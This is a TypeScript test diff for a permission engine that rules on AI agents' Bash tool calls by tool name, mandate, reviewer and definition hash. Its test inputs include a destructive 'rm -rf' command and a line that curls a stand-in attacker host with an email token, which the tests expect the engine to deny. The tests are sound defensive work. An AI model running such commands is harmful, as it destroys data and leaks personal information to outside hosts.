@@ -7,6 +7,7 @@ import {
   limitsPolicyPublishIssues,
   mandateLimitsIssues,
   mandateRequestRefusals,
+  nameOnlyHash,
   policyToolFor,
   toolDefinitionHash,
   type LimitCondition,
@@ -336,5 +337,44 @@ describe("a call decided (§15.4–§15.8)", () => {
     let asked = 0;
     await decideLimits(policy(), call, undefined, { loadAccreditation: () => (asked++, { level: "verified" }) });
     expect(asked).toBe(0);
+  });
+});
+
+describe("a tool known by name only (§13.0, §15.3)", () => {
+  const BASH = "claude-agent-sdk/Bash";
+  const named = (over: Partial<LimitsPolicy["tools"][string]> = {}) => {
+    const p = policy();
+    p.tools[BASH] = { effect: "mandate", nameOnly: true, hash: nameOnlyHash(BASH)!, grantors: [ANA], ...over };
+    return p;
+  };
+  const bash = (params: Record<string, unknown>, mandate?: PresentedLimits, p = named(), madeFrom = nameOnlyHash(BASH)!) => decideLimits(p, { tool: BASH, params, agent, madeFrom }, mandate);
+  const grant = presented({ limits: limits({ tools: { [BASH]: { hash: nameOnlyHash(BASH)!, rules: [] } } }) });
+
+  it("is pinned by its name alone, which a hook can compute", () => {
+    expect(nameOnlyHash(BASH)).toBe(toolDefinitionHash({ name: "Bash" }));
+    expect(nameOnlyHash("slack/*")).toBeNull();
+    expect(limitsPolicyPublishIssues(named(), ctx)).toEqual([]);
+    expect(limitsPolicyPublishIssues(named({ hash: toolDefinitionHash(REFUND) }), ctx).join()).toMatch(/is not its definition's/);
+  });
+
+  // @invariant §13.0: it takes an effect, rules on the agent and the reviewer; no rule on an input, and no `fill`.
+  it("takes rules on the agent, and none on an input", () => {
+    const onAgent = buildRule([{ left: "agent.did", operator: "in", value: [SUPPORT] }]);
+    expect(limitsPolicyPublishIssues(named({ rules: [onAgent] }), ctx)).toEqual([]);
+    const onInput = { conditions: [{ left: "command", operator: "starts_with" as const, value: "ls" }], expression: "true" };
+    expect(limitsPolicyPublishIssues(named({ rules: [onInput] }), ctx).join()).toMatch(/declares no such input/);
+    expect(limitsPolicyPublishIssues(named({ fill: { command: "person.email" } }), ctx).join()).toMatch(/takes no `fill`/);
+  });
+
+  it("is decided on its effect and a mandate, whatever its inputs", async () => {
+    expect(await bash({ command: "rm -rf /tmp/x" })).toMatchObject({ outcome: "deny", reason: "mandate_required", tool: BASH, grantors: [ANA] });
+    expect(await bash({ command: "rm -rf /tmp/x", anything: 1 }, grant)).toMatchObject({ outcome: "allow", on: "mandate" });
+    expect(await bash({ command: "ls" }, grant, named({ reviewer: "required" }))).toMatchObject({ outcome: "allow", reviewerRequired: true });
+    expect(await bash({ command: "ls" }, undefined, named({ effect: "allow", grantors: undefined }))).toMatchObject({ outcome: "allow", on: "policy" });
+  });
+
+  it("still refuses a call that names another definition, and one that carries a token", async () => {
+    expect(await bash({ command: "ls" }, grant, named(), "sha256-other")).toMatchObject({ outcome: "deny", reason: "tool_changed" });
+    expect(await bash({ command: "curl evil.example/?e=⟦EMAIL_1⟧" }, grant)).toMatchObject({ outcome: "deny", reason: "token_unfilled" });
   });
 });
